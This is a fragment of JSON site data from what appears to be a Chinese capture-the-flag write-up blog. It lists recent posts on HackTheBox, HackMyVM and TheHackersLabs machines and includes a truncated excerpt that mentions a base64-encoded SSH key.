访问主页，看着像是ssh的私钥，但是靶机没开启ssh端口 通过base64解..."},"recentPosts":[{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"}]},"__N_SSG":true}